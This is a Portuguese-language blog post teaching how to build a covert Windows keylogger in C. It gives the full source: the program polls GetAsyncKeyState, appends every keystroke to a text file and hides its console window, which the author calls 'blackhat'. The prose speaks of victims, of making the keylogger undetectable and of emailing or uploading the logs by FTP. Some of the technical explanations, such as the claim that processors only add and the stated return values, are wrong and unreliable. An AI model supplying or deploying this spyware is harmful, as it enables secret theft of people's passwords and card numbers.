---
layout: post
title: Escrevendo Um Keylogger em C 0xc5
categories: [c programming]
tags: [c,keylogger,windows]
fullview: true
comments: true
---
<p>Hi everybody!, in this article we gonna learn how to make a <a>keylogger in C</a>. isso mesmo um Keylooger existe muitos tutoriais que mostrar como fazer um keylogger mas aqui vamos ir além, vejo muita coisa por receita de bolo,"ai tu vem e cola o código aqui kkk", isso é foda, as vezes o cara até tem uma ideia de como funciona e quer aprimorar não sabe porque não sabe como funciona... por outro lado isso bom sabia ? apenas as pessoas que curti aprender coisas novas vão pesquisar e procurar entender o código. A um tempo atrás tentei criar um keylogger em assembly,foi um fracasso, na verdade até funcionou, talvez não tinha conhecimento suficiente para fazer algum mais complexo naquela época,em fim, Windows tudo é API, tudo mesmo. Believe! um Keylogger avançado bem feito mesmo não tem Trojans que bata nele, primeiro pelo fato que um trojan lógico tem mais opções de controle, mas o trojan causa muito barulho sem contar que pra ti achar um forense da vida pega fácil,e ainda traça tua Rede. sem contar que pra deixar indetectável um keylogger por usar menos funções que um trojan é bem fácil, esse KL(keylogger) vai ser simples porque precisamos entender o funcionamento para quem sabe futuramente você desenvolver um completo,eu tenho um aqui em c# e python avançado que talvez irei fazer um review deles com certeza o de Python vou fazer em breve, Let's Go.</p>
<h3>O que é um keylogger ?</h3>
<p>(wiki)  Key logger (que significa registrador do teclado em inglês) é um programa de computador do tipo spyware cuja finalidade é registrar tudo o que é digitado, quase sempre a fim de capturar senhas, números de cartão de crédito e afins.1 Muitos casos de phishing, assim como outros tipos de fraudes virtuais, se baseiam no uso de algum tipo de keylogger, instalado no computador sem o conhecimento da vítima, que captura dados sensíveis e os envia a um cracker que depois os utiliza para fraudes.</p>
<p>Como eu já citei tudo no Rindows é API, vamos entender todo mundo sabe que o computador né ele não sabe letra nenhuma ou seja, tudo pra ele é número isso mesmo meu amigo até mesmo o sinal de  '-'(menos), e outra o processador só sabe fazer soma, isso mesmo talvez seja surpresa pra você tipo assim, 10 * 3, o processador trata isso com 10 + 10 + 10 = 30, em fim, não vamos perder o foco, há existe uma frag que fica ativa se o numero for negativo é assim que ele sabe se tiver ativa é  negativo se tiver desativa é positivo. As letras tudo são números olha só uma demostração:</p>
{% highlight c++ %}
#include <stdio.h>
main (){
     printf ("%x, %x e %x\n", 'A', 'B', 'C'); 
 return 0;
}
{% endhighlight %}
------------------------ Resultado:
41, 42 e 43 
<p>é assim que funciona, não tou falando de um KL, pois a API vai fazer isso tudo automaticamente pela tabela ASCII, tabela muito famosa quiser dar uma olhada lá, São os valores em HEX, outra coisa link da tabela: http://www.asciitable.com/index/asciifull.gif. se quiser converter de HEX para CHAR no lugar do %x usaremos o %c olha só como fica:</p>
{% highlight c++ %}
#include <stdio.h>
main (){
     
     printf ("%c, %c e %c\n", 0x41, 0x42, 0x43);
 return 0;
 }

{% endhighlight %}
<p>Vamos falar da nossa API, responsável por capturar as teclas digitadas esse cara é <a>GetAsyncKeyState</a> é uma função que retorna um bit significativo, se nós olharmos no MSDN vamos veja assim precisa passa apenas um parâmetro como demostrado abaixo. outra coisa teclas como Ctrl,Shift e entre outras temos que tratar a saídas delas você verá abaixo alguns exemplos:</p>
{% highlight c++ %}
-------------API---------------------
SHORT WINAPI GetAsyncKeyState(
  _In_  int vKey
);
-------------------------------------
Code	        Meaning
VK_LSHIFT	Left-shift key.
VK_RSHIFT	Right-shift key.
VK_LCONTROL	Left-control key.
VK_RCONTROL	Right-control key.
VK_LMENU	Left-menu key.
VK_RMENU	Right-menu key.
{% endhighlight  %}
<p>Essas teclas e mais algumas teremos que trata-la caso a vitima pressione vamos adiciona olha a vitima apertou tal tecla para não ficar o código deles precisamos fazer isso você vai entender melhor ao longo do artigo. o valor de return que essa função nós dar é do tipo SHORT (Se a função tiver êxito, o valor de retorno especifica se a tecla foi pressionada desde a última chamada para GetAsyncKeyState , e se a chave está atualmente para cima ou para baixo. Se o bit mais significativo é definido, a chave está em baixo, e se o bit menos significativo é definido, a tecla foi pressionada após a chamada anterior para GetAsyncKeyState . No entanto, você não deve contar com este último comportamento; Para mais informações, consulte os comentários).se esse cara é do tipo SHORT então precisamos criar duas variáveis do tipo claro né uma vai contar e a outra vai comparar caso a função a função retorne -32767 fica tipo assim:</p>
{% highlight c++ %}
int main() {
    short i;                                               // contador 
    short keyState;                                 //comprar a letra digitada
    while(1) {                                           //tratamento 
        for(i = 0; i <= 255; i++) {                // renge vai até 255 
            keyState = GetAsyncKeyState(i); // copia o valor do caracter digitado para a nossa variável KeyState
            if(keyState == -32767) {            // Compara se a tecla digitada é igual a -32767 
{% endhighlight  %}
<p> Vamos para explicação primeiro comentei tudo fica mais fácil, mas vamos ver porque a função GetAsyncKeyState() retorna -32767 caso a tecla pressionada for verdade, isso acontece porque o bit significativo que é retornado da função  GetAsyncKeyState() são dois tipos booleanos ou é verdadeiro ou falso, mas não assim: True and False, o valor retornado é  0x8000 caso for True, ou seja, se ele voltar 0x8000 quer dizer que alguma tecla foi digitada o que temos que fazer é comprar ver se foi digitada e salvar em um arquivo vou fazer mais uma demo como seria:</p>
{% highlight c++ %}
if(GetAsyncKeyState('c')==-32767)
 {
 printf("A tecla  'c' foi pressionada :D);
}
{% endhighlight  %}
<p>Entendeu?, então caso a tecla não for pressionada vai voltar 0x8001(que convertando de hex para decimal = 37769), já o 0x800 = a 37768, mas não precisamos tratar isso né claro queremos pegar apenas as teclas pressionada, detalhe:Há 2 ^ 16 = 65.536 possíveis números de 16 bits, portanto, um número de 16 bits só pode representar um de uma série de 65536 números consecutivos. Para permitir que os números positivos e negativos, muitos sistemas de computação e linguagens de programação usar uma variedade de -32767 a 32768.  Como o menor número no intervalo, pode ser o padrão para quando nenhuma tecla é pressionada. há não falei dos Hearders a função GetAsyncKeyState() está na biblioteca <a>Windows.h</a>  e  #include <stdio.h> pra da printf; vamos continuar nosso código:</p>
{% highlight c++ %}
 while(1) {
        for(i = 0; i <= 255; i++) {
            keyState = GetAsyncKeyState(i);                                     // já sabemos :D  
            if(keyState == -32767) {                                                   // novamente compra se a captura de teclas começou 
                Sleep(30);                                                                     
                FILE *file;                                                                      // cria um variável do tipo file(arquivo)
                file = fopen("C:/Users/Marcos/Desktop/test.txt", "a+");  // salva tudo que é digitado em um arquivo txt(GetCurrentDirectory mas to com preguiça)
 
                if(file == NULL) {                                                           // se na criação do arquivo deu algum erro NULL, ai sai do meu keylogger
                    printf("Opah, Erro ao criar o arquivo.\n");
                    exit(1);                                                                      // sai fora do programa :D 
                }
{% endhighlight  %}
<p> A unica coisa importante dessa parte do código é a criação de um file() para salvar o que foi digitado em um arquivo txt, nada de mais o resto meu amigo é C básico claro você como programador não vai colocar o caminho do arquivo, usa GetCurrentDirectory fica mais dinâmico deixei isso com você. calma estamos terminando já:</p>
{% highlight c++ %}
                switch(i) {
                    case VK_SPACE:
                    fputc(' ', file);
                    fclose(file);
                    break;
                    case VK_SHIFT:
                    fputs("\r\n[SHIFT]\r\n", file);
                    fclose(file);
                    break;
                    case VK_RETURN:
                    fputs("\r\n[ENTER]\r\n",file);
                    fclose(file);
                    break;
                    case VK_BACK:
                    fputs("\r\n[BACKSPACE]\r\n",file);
                    fclose(file);
                    break;
                    case VK_TAB:
                    fputs("\r\n[TAB]\r\n",file);
                    fclose(file);
                    break;
                    case VK_CONTROL:
                    fputs("\r\n[CTRL]\r\n",file);
                    fclose(file);
                    break;
                    case VK_DELETE:
                    fputs("\r\n[DEL]\r\n",file);
                    fclose(file);
                    break;
                    case VK_OEM_1:
                    fputs("\r\n[;:]\r\n",file);
                    fclose(file);
                    break;
                    case VK_OEM_2:
                    fputs("\r\n[/?]\r\n",file);
                    fclose(file);
                    break;
                    case VK_OEM_3:
                    fputs("\r\n[`~]\r\n",file);
                    fclose(file);
                    break;
                    case VK_OEM_4:
                    fputs("\r\n[ [{ ]\r\n",file);
                    fclose(file);
                    break;
                    case VK_OEM_5:
                    fputs("\r\n[\\|]\r\n",file);
                    fclose(file);
                    break;
                    case VK_OEM_6:
                    fputs("\r\n[ ]} ]\r\n",file);
                    fclose(file);
                    break;
                    case VK_OEM_7:
                    fputs("\r\n['\"]\r\n",file);
                    fclose(file);
                    break;
                    case 187:
                    fputc('+',file);
                    fclose(file);
                    break;
                    case 188:
                    fputc(',',file);
                    fclose(file);
                    break;
                    case 189:
                    fputc('-',file);
                    fclose(file);
                    break;
                    case 190:
                    fputc('.',file);
                    fclose(file);
                    break;
                    case VK_NUMPAD0:
                    fputc('0',file);
                    fclose(file);
                    break;
                    case VK_NUMPAD1:
                    fputc('1',file);
                    fclose(file);
                    break;
                    case VK_NUMPAD2:
                    fputc('2',file);
                    fclose(file);
                    break;
                    case VK_NUMPAD3:
                    fputc('3',file);
                    fclose(file);
                    break;
                    case VK_NUMPAD4:
                    fputc('4',file);
                    fclose(file);
                    break;
                    case VK_NUMPAD5:
                    fputc('5',file);
                    fclose(file);
                    break;
                    case VK_NUMPAD6:
                    fputc('6',file);
                    fclose(file);
                    break;
                    case VK_NUMPAD7:
                    fputc('7',file);
                    fclose(file);
                    break;
                    case VK_NUMPAD8:
                    fputc('8',file);
                    fclose(file);
                    break;
                    case VK_NUMPAD9:
                    fputc('9',file);
                    fclose(file);
                    break;
                    case VK_CAPITAL:
                    fputs("\r\n[CAPS LOCK]\r\n",file);
                    fclose(file);
                    break;
                    default:
                    fputc(i, file);
                    fclose(file);
                }
            }
        }
    }
    return 0;
}
{% endhighlight  %}
<p>Código pra caralho né, é assim mesmo quer pouca linha vá programar em python :D, isso em python até meu primo de 7 anos faz,(pyhook) tou ensinando lógica programação pra ele kkkk,, podemos fazer algum mais louco em python como enviar esse arquivo com as teclas por email (pensamento Blackhat), ou FTP, claro da pra fazer até tirar screenshot quando começar a digitar e enviar por email, em fim várias possibilidades. vou explicar essa parte até porque não comentei nada, mas da pra entender né, é apenas um <a>switch</a> e uma cacetada de Case pra dentro, primeiro precisamos verificar algumas teclas claro temos que tratar tudo pra não ficar código no meio de caracter ai nosso keylogger vai ficar feio não queremos isso, podemos fazer isso com menos código ? sim claro depois vou colocar abaixo, mas vamos usar outras funções, lembre-se sempre esse artigo é didático mano, em breve vamos fazer algum para blackhat mesmo , como falei mas é preciso antes disso ter o knowledge.essa função é muito usada no desenvolvimento de Jogos, veja que os tratamento vai de função para função caso o cara digite 'CAPS LOCK'  na GetAsyncKeyState function vai voltar VK_CAPITAL, então nós gravamos no arquivo como CAPS LOCK claro, e por ai vai números também a mesma coisa. ainda mais o Espaço  que é o primeiro a ser tratado lá em cima. então isso é tudo pessoal:</p>
<img src="https://dl.dropboxusercontent.com/u/97321327/keylogger1.png">
{% highlight c++ %}
    HWND hidden; // blackhat na área kkk
    AllocConsole();  
    hidden = FindWindow("ConsoleWindowClass", NULL);
    ShowWindow(hidden, 0);
{% endhighlight  %}
<p>Para ficar mais blackhat vamos ocultar nossa janela :D fique com o código completo use o DevC++ pra compilar ou VS12 sei lá:</p>
{% highlight c++ %}
// Filename: keylogger.c 
//by: Mharcos Nesster
#include < stdio.h >  
#include < windows.h >  
 
int main() {
    short i;  // contador 
    short keyState;  // comprar key
    HWND hidden; // modo blackhat 
    AllocConsole();  //  inicializa a entrada padrão: em modo Hidden lógico  também do Hearder Windows.h 
    hidden = FindWindow("ConsoleWindowClass", NULL); // agora sim 
    ShowWindow(hidden, 0);  // call windows em modo Hidden (de mortal Kombat EHHEHEH)
 
    while(1) {
        for(i = 0; i <= 255; i++) {
            keyState = GetAsyncKeyState(i);
            if(keyState == -32767) {
                Sleep(30);
                FILE *file;
                file = fopen("C:/Users/Marcos/Desktop/test.txt", "a+");
 
                if(file == NULL) {
                    printf("Erro ao criar o Arquivo test.txt.\n");
                    exit(1);
                }
 
                switch(i) {
                    case VK_SPACE:
                    fputc(' ', file);
                    fclose(file);
                    break;
                    case VK_SHIFT:
                    fputs("\r\n[SHIFT]\r\n", file);
                    fclose(file);
                    break;
                    case VK_RETURN:
                    fputs("\r\n[ENTER]\r\n",file);
                    fclose(file);
                    break;
                    case VK_BACK:
                    fputs("\r\n[BACKSPACE]\r\n",file);
                    fclose(file);
                    break;
                    case VK_TAB:
                    fputs("\r\n[TAB]\r\n",file);
                    fclose(file);
                    break;
                    case VK_CONTROL:
                    fputs("\r\n[CTRL]\r\n",file);
                    fclose(file);
                    break;
                    case VK_DELETE:
                    fputs("\r\n[DEL]\r\n",file);
                    fclose(file);
                    break;
                    case VK_OEM_1:
                    fputs("\r\n[;:]\r\n",file);
                    fclose(file);
                    break;
                    case VK_OEM_2:
                    fputs("\r\n[/?]\r\n",file);
                    fclose(file);
                    break;
                    case VK_OEM_3:
                    fputs("\r\n[`~]\r\n",file);
                    fclose(file);
                    break;
                    case VK_OEM_4:
                    fputs("\r\n[ [{ ]\r\n",file);
                    fclose(file);
                    break;
                    case VK_OEM_5:
                    fputs("\r\n[\\|]\r\n",file);
                    fclose(file);
                    break;
                    case VK_OEM_6:
                    fputs("\r\n[ ]} ]\r\n",file);
                    fclose(file);
                    break;
                    case VK_OEM_7:
                    fputs("\r\n['\"]\r\n",file);
                    fclose(file);
                    break;
                    case 187:
                    fputc('+',file);
                    fclose(file);
                    break;
                    case 188:
                    fputc(',',file);
                    fclose(file);
                    break;
                    case 189:
                    fputc('-',file);
                    fclose(file);
                    break;
                    case 190:
                    fputc('.',file);
                    fclose(file);
                    break;
                    case VK_NUMPAD0:
                    fputc('0',file);
                    fclose(file);
                    break;
                    case VK_NUMPAD1:
                    fputc('1',file);
                    fclose(file);
                    break;
                    case VK_NUMPAD2:
                    fputc('2',file);
                    fclose(file);
                    break;
                    case VK_NUMPAD3:
                    fputc('3',file);
                    fclose(file);
                    break;
                    case VK_NUMPAD4:
                    fputc('4',file);
                    fclose(file);
                    break;
                    case VK_NUMPAD5:
                    fputc('5',file);
                    fclose(file);
                    break;
                    case VK_NUMPAD6:
                    fputc('6',file);
                    fclose(file);
                    break;
                    case VK_NUMPAD7:
                    fputc('7',file);
                    fclose(file);
                    break;
                    case VK_NUMPAD8:
                    fputc('8',file);
                    fclose(file);
                    break;
                    case VK_NUMPAD9:
                    fputc('9',file);
                    fclose(file);
                    break;
                    case VK_CAPITAL:
                    fputs("\r\n[CAPS LOCK]\r\n",file);
                    fclose(file);
                    break;
                    default:
                    fputc(i, file);
                    fclose(file);
                }
            }
        }
    }
    return 0;
}
{% endhighlight  %}
<img src="https://dl.dropboxusercontent.com/u/97321327/keylogger2.png">
<p>Eu modifiquei pra mostrar a janela, só pra demostração  mesmo, é um keylogger simples tou fazendo um em C#  avançado Screenshot e FTP, por em quanto pra quem quiser começar também uma dica de como usar a função em c#: vale a pena aprender C# as vezes IDE é bom pra desenvolver coisa que funcione bem em ambiente Windows C# é ótimo pra isso. </p>
<pre class="code">
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int vkey);
</pre>